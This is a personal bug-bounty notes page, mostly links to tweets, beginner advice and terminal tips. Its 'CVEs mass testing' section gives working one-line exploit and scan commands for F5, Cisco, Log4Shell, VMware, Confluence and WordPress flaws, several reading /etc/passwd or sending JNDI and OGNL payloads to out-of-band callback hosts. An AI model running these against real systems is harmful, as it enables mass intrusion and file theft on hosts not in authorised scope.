<summary>Low hanging fruits</summary>

<dl>
<dd>

https://www.cyberick.com/post/look-for-these-low-hanging-fruits-in-bug-bounty

</dd>
</dl>

</details>

<details>
<summary>Lazy bug bounty hunting ?</summary>

<dl>
<dd>

1. Get ASN of company :

whois -h http://whois.cymru.com $(dig +short http://tesla.com)

2. Then use ASN filter in shodan to scroll through bunch of iP’s

https://www.shodan.io/search?query=asn%3Aas394161

</dd>
</dl>

</details>

<details>
<summary>Bug bounty with mobile ?</summary>

<dl>
<dd>

https://twitter.com/rootxyash/status/1482968235138228228

</dd>
</dl>

</details>

<details>
<summary>https://github.com/cipher387/Dorks-collections-list</summary>



</details>

<details>
<summary>Writeups Gold Mine</summary>

<dl>
<dd>

https://www.bugbountyhunting.com/

https://webhacklist.com/#museum

</dd>
</dl>

</details>

MISC

<details>
<summary>Iconic Deep Shit Tweets</summary>

<dl>
<dd>

1. https://x.com/Marco_Acortes/status/341578219176214528?s=20

2. https://x.com/iamasoothsayer/status/1535494638391664641?s=20

3. https://x.com/ReebootToInit5/status/1749672887890628951?s=20

4. https://x.com/valuenilled/status/2117971560493654266?a=WI6le_BejH_qqU2smDo&s=20

5. https://x.com/drstrangiove/status/2122987796189356532/video/1?a=3nXr7GVczZWIOZnKPgY&s=46

</dd>
</dl>

</details>

<details>
<summary>Resume creation</summary>

<dl>
<dd>

https://x.com/Suraj_N_Das/status/1982119667649970682?s=20

</dd>
</dl>

</details>

<details>
<summary>Delete your Digital footprint</summary>

<dl>
<dd>

https://x.com/AIBuzzNews/status/1981719460869214401?s=20

</dd>
</dl>

</details>

<details>
<summary>AI Stuff</summary>

<dl>
<dd>

https://x.com/rez0__/status/2110674274340249778

https://x.com/rez0__/status/2109093490806386738

https://x.com/mainteemoforfun/status/2109281844977934733

https://x.com/zack0x01_/status/2114337779325026439

https://x.com/zack0x01_/status/2106203484018360613

https://x.com/Zaddyzaddy/status/2077409670977716628

https://x.com/XZCVZK/status/2111084201260806507

https://x.com/_jensec/status/2109893692001767781

https://x.com/NightRang3r/status/2108560185598095512

https://x.com/zack0x01_/status/2114737959358595303

https://x.com/Hacker0x01/status/2114749076440744280

https://x.com/qwerty__cs/status/2114661747546349816

https://x.com/zack0x01_/status/2115055340459000214

https://x.com/Jhaddix/status/2115131159361523753

https://x.com/Jhaddix/status/2115155253511463132

https://x.com/rez0__/status/2115134071961497617

https://x.com/ciruai/status/2115062210070204780

https://x.com/jun_song/status/2115228612249137476

https://x.com/mdp_sec/status/2115445983752638800

https://x.com/zack0x01_/status/2109900011022725496

https://x.com/OfficialLoganK/status/2115489284404940898

https://x.com/galnagli/status/2115508267786936667

https://x.com/mdp_sec/status/2115614748742218045

https://x.com/pratikg/status/2115584411567866147

https://x.com/0xMstar/status/2115807838308294680

https://x.com/infinitelogins/status/2116236446147240443

https://x.com/jun_song/status/2116308701607030872

https://x.com/0x0SojalSec/status/2116263439681417554

https://x.com/galnagli/status/2116479102442234094

https://x.com/mdp_sec/status/2116435032437035389

https://x.com/rlaope/status/2117413983959523544

https://x.com/bug_vs_me/status/2118022292483842277

https://x.com/arshadkazmi42/status/2118301998403744097

https://x.com/vulnix0x4/status/2118502352303071414

https://x.com/texhnogatsby/status/2118327632869880138

https://x.com/hakluke/status/2118721901014946166

https://x.com/hakluke/status/2118721906769531208

https://x.com/kc_srk/status/2118997875204206969

https://x.com/0xTib3rius/status/2119162915995439448

https://x.com/zack0x01_/status/2119409731806900472

https://x.com/zack0x01_/status/2119493755036471548

https://x.com/3nc0d3dGuY/status/2123841401825935722?a=d-NwZ6JIX00B5ha9z4s&s=20

https://x.com/zack0x01_/status/2124242831443398796?a=JSifisDVsYmPjO_kgGY&s=20

https://x.com/OreoB1scuit/status/2123857433022058880?a=jxydOlO5IxpBixhodPQ&s=20

</dd>
</dl>

</details>

<details>
<summary>Everything you need to survive and rebuild society.</summary>

<dl>
<dd>

https://x.com/farbood/status/2122413856693858581?a=8DvhtGqxrzKd1-d5MTE&s=20

</dd>
</dl>

</details>

<details>
<summary>Notes</summary>

<dl>
<dd>

1. Herman Miller x Logitech is good chair.

2. (Unverified) Magnesium supplement daily with tryptofan, this will increase your health & sleep in natural & healthy way.

3. (Unverified) For best sleep: magnesium glycinate and zinc

</dd>
</dl>

</details>

## **Advices for Beginners:**

<details>
<summary>Ultimate course/classes to understand the Basics</summary>

<dl>
<dd>

1. https://tryhackme.com/path/outline/web

2. https://web.stanford.edu/class/cs253/

3. https://www.cloudflare.com/en-in/learning/ddos/glossary/open-systems-interconnection-model-osi/

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 1</summary>

<dl>
<dd>

- Sleep well

- Learn vulnerability types (owasp)

- Focus on 1 each time

- Read & practice

- Learn how to find and exploit

- Understand how to analyse website

- See how others do (reports)

- Learn 1 programming language

- Make your own scripts

- Don’t rush

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 2</summary>

<dl>
<dd>

When you are hacking, turn off social media, silence off your cell phone, put on non-distracting music, and only have tabs open related to your target, your hacking platform, and the tools needed to do the job. Distractions are where productivity goes to die!

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 3</summary>

<dl>
<dd>

Couple of tips:

1. Know when to work and when to rest

2. Work on scopes you like

3. Invest hard in knowing a couple of vulnerability classes

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 4</summary>

<dl>
<dd>

Tryhackme, writeups, hunt, hunt, hunt, hunt, fail, hunt, learn learn,apply what you've learned, hunt, buy a common bug bounty book, read half of it. Hunt more. Make your own methodology and hunt, fail, hunt,succeed, hunt, fail, learn, repeat.

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 5</summary>

<dl>
<dd>

You cannot master XSS without JS , also SQLi without SQL , upload file vuln without php or at least how the web app works ..Using tools like sqlmap for every sql flaw you find (or you guess by seeing user field) is a waste of time, and if the tool doesn't work you will loose alot

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 6</summary>

<dl>
<dd>

https://twitter.com/nnwakelam/status/1108945995646156800?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 7</summary>

<dl>
<dd>

https://twitter.com/NahamSec/status/1479727756795543556?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 8</summary>

<dl>
<dd>

https://twitter.com/harshbothra_/status/1479451102408065033?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 9</summary>

<dl>
<dd>

https://twitter.com/naglinagli/status/1399440276649828353?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 10</summary>

<dl>
<dd>

https://twitter.com/_TheSecurityGuy/status/1478237827930361857?s=20&t=heL2SFnKz1QeHEEqyS0_lw

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 11</summary>

<dl>
<dd>

https://twitter.com/tabaahi_/status/1475541168230256645?s=20&t=GKrwu5s19YIhSUhW2XBTpw

https://twitter.com/marcos_iaf/status/1471159254593589248?s=20&t=GKrwu5s19YIhSUhW2XBTpw

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 12</summary>

<dl>
<dd>

https://twitter.com/rbhichher/status/1457661598605053959?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

</dd>
</dl>

</details>

<details>
<summary>Bug bounty Advice 13</summary>

<dl>
<dd>

https://twitter.com/therceman/status/1573261527859314688?s=20&t=6VC1lmPwI-YNFAyaG1cLDQ

</dd>
</dl>

</details>

<details>
<summary>Bug bounty advice 14</summary>

<dl>
<dd>

https://x.com/NahamSec/status/1851818696685314160?s=20

</dd>
</dl>

</details>

<details>
<summary>Motivating Quote</summary>

<dl>
<dd>

![](image%203.png)

</dd>
</dl>

</details>

<details>
<summary>Learn Learn & Learn</summary>

<dl>
<dd>

https://twitter.com/hakluke/status/1457577822302572545?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

</dd>
</dl>

</details>

<details>
<summary>Broad Scope Target</summary>

<dl>
<dd>

https://twitter.com/theXSSrat/status/1479535804074573826?s=20&t=mGFdrpw2UKHGVklpbLtVEQ

</dd>
</dl>

</details>

<details>
<summary>Develop Hacking Skills</summary>

<dl>
<dd>

https://twitter.com/hacker_/status/1509147511256190977?s=20&t=Ujxe9fvTSvIyPEcEy2ryxg

https://sicks3c.medium.com/extreme-hacking-mindset-54943a4510f3

</dd>
</dl>

</details>

<details>
<summary>Develop Report writing Skills</summary>

<dl>
<dd>

https://twitter.com/HackerGautam/status/1443122612524048388?s=20&t=gKaH2wX89dkXxLpTSP9mAQ

</dd>
</dl>

</details>

<details>
<summary>Tips</summary>

<dl>
<dd>

1. Checkout & learn all bugcrowd VRT bugs

2. https://twitter.com/jobertabma/status/998769037445230592?s=20&t=a7kh2kk0BLW0TITv9kuXbQ

3. https://twitter.com/tabaahi_/status/1472810019682807808?s=20&t=GKrwu5s19YIhSUhW2XBTpw

</dd>
</dl>

</details>

<details>
<summary>Another one</summary>

<dl>
<dd>

1. watch every video of @nahamsecs live recon maybe over 3 times minimum.

2. Study @Jhaddix bug bounty methodology…all of them.

3. Read almost every http://pentester.land blog and articles.

4. Last but not least, learn to chase the thrill of finding bugs

</dd>
</dl>

</details>

<details>
<summary>Report writing Tip</summary>

<dl>
<dd>

I just need more than 5 line in Description

I give 2 Steps To Reproduce

Short Steps To Reproduce to bugcrowd team to save time on triager

Steps To Reproduce For Customer Team From A to Z

POC  
2-10 lines

Impact  
3-6 line

</dd>
</dl>

</details>

<details>
<summary>Two different ideologies of bug hunting</summary>

<dl>
<dd>

`There's a huge difference between the bug bounty envolving research, finding a bug, ( sometimes chaining multiple ones ), developing an exploit` AND `the bug bounty of subdomain&cms discovery, checking exploits for cves in github,waiting for 1day bugs and their exploits to report.`

</dd>
</dl>

</details>

<details>
<summary>Bug bounty learning Roadmap</summary>

<dl>
<dd>

1. Book: @vickieli7 ‘s BBB + @yaworsk ‘s WH101 + RWBH

2. Blogs: @InfoSecComm

3. Courses: @OffensiveHunter + @NahamSec + @HusseiN98D + @theXSSrat

4. Platform: @WebSecAcademy @PentesterLab @BugBountyHunt3r

5. Methodologies: Reconnaissance:

@Jhaddix @harshbothra\_ @zseano

6. Computer Science Fundamentals:

@geeksforgeeks

<details>
<summary>Some spices of Motivation :</summary>

<dl>
<dd>

https://t.co/59XRuWeQWy

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>Q/A goldmine</summary>

<dl>
<dd>

https://twitter.com/sillydadddy/status/1573298185195618305?s=20&t=6VC1lmPwI-YNFAyaG1cLDQ

</dd>
</dl>

</details>

## **CVEs mass testing: (old)**

<details>
<summary>CVE-2020-5902</summary>

<dl>
<dd>

1. shodan search http.favicon.hash:-335242539 "3992" --fields ip\_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \0330;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done

</dd>
</dl>

</details>

<details>
<summary>CVE-2020-3452</summary>

<dl>
<dd>

1. while read LINE; do curl -s -k "[https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2BCSCOE%2B/portal\_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < domain\_list.txt

</dd>
</dl>

</details>

<details>
<summary>CVE-2021-44228</summary>

<dl>
<dd>

1. cat subdomains.txt | while read host do; do curl -sk --insecure --path-as-is "$host/?test=${jndi:ldap://log4j.requestcatcher.com/a}" -H "X-Api-Version: ${jndi:ldap://log4j.requestcatcher.com/a}" -H "User-Agent: ${jndi:ldap://log4j.requestcatcher.com/a}";done

2. cat urls.txt | sed `s/https:///` | xargs -I {} echo `{}/${jndi:ldap://{}attacker.burpcollab.net}` >> lo4j.txt

3. subfinder -d target.com -silent |puredns resolve -q |httprobe | while read url; do case1=$(curl -s $url -H "X-Api-Version: ${jndi:ldap://Yourburpcolab/a}"); case2=$(curl -s "$url/?test=${jndi:ldap://Yourburpcolab/a}"); case3=$(curl -s $url -H "User-Agent: ${jndi:ldap://Yourburpcolab/a}"); echo -e "\033[43mDOMAIN => $url\033[0m]" "\n" " Case1=> X-Api-Version: running-Ldap-payload" "\n" " Case1=> Useragent: running-Ldap-payload" "\n" " Case1=> $url/?test=running-Ldap-payload" "\n";done

</dd>
</dl>

</details>

<details>
<summary>CVE-2022-0378</summary>

<dl>
<dd>

1. cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from\_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done

</dd>
</dl>

</details>

<details>
<summary>CVE-2022-22954</summary>

<dl>
<dd>

1. cat urls.txt | while read h do ; do curl -sk --path-as-is “$h/catalog-portal/ui/oauth/verify?error=&deviceUdid=${"freemarker.template.utility.Execute"?new()("cat /etc/hosts")}”| grep "context" && echo "$h\033[0;31mV\n"|| echo "$h \033[0;32mN\n";done

</dd>
</dl>

</details>

<details>
<summary>CVE-2022-26134 `Confluence RCE automation`</summary>

<dl>
<dd>

1. subfinder -d target -o all | cat all | sed 's/https\?:\/\///' | xargs -I {} echo '{}/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%22nslookup%20{}.burp.oastify.com%22%29%7D/' | httpx -sc -title -o out

</dd>
</dl>

</details>

<details>
<summary>CVE-2022-31474</summary>

<dl>
<dd>

$ cat hosts | httpx -title -path "/wp-admin/admin-post.php?page=pb\_backupbuddy\_destinations&local-destination-id=/etc/passwd&local-download=/etc/passwd" -match-string "root:x:0:0"

</dd>
</dl>

</details>

<details>
<summary>Dorks for CVE-2022-2544 & CVE-2022-2558 :</summary>

<dl>
<dd>

inurl:wp-content/uploads/jobpost  
inurl:wp-content/uploads/wpjobboard

</dd>
</dl>

</details>

---

## **Linux Terminal hacks :**

<details>
<summary>compare two files graphically</summary>

<dl>
<dd>

Using `meld` , e.g,

$meld gotator.output ripgen.output

</dd>
</dl>

</details>

<details>
<summary>File content counting</summary>

<dl>
<dd>

Using following command , and can be piped in other commands. e.g,

$cat file.txt | `wc` -L

</dd>
</dl>

</details>

### .Bashrc file :

<details>
<summary>https://twitter.com/naglinagli/status/1291686345027485697</summary>

<dl>
<dd>

<details>
<summary>Usage</summary>

<dl>
<dd>

Simply add this into your ~/.bashrc:

```
ffufr() {
  ffuf -c -w "/path/to/SecLists/Discovery/Web-Content/$1" -u "$2/FUZZ" -recursion
}
```

Also make sure you have the latest https://github.com/danielmiessler/SecLists and the correct path in the function above.

Now you can perform recursive directory searching (dirbusting) of your target domain easily like this:

```
ffufr WORDLISTNAME.txt DOMAIN.com
```

Use this with any of the wordlist that is in the ‘SecLists/Discovery/Web-Content/’ directory. Here’s an example using the ‘tomcat.txt’ wordlist:

</dd>
</dl>

</details>

</dd>
</dl>

</details>

<details>
<summary>https://github.com/emadshanab/Reconnaissance</summary>



</details>

<details>
<summary>https://github.com/emadshanab/recon_profile</summary>



</details>

<details>
<summary>Aliases to terminal</summary>

<dl>
<dd>

https://twitter.com/themarcba/status/1573229906351226880?s=20&t=6VC1lmPwI-YNFAyaG1cLDQ

</dd>
</dl>

</details>
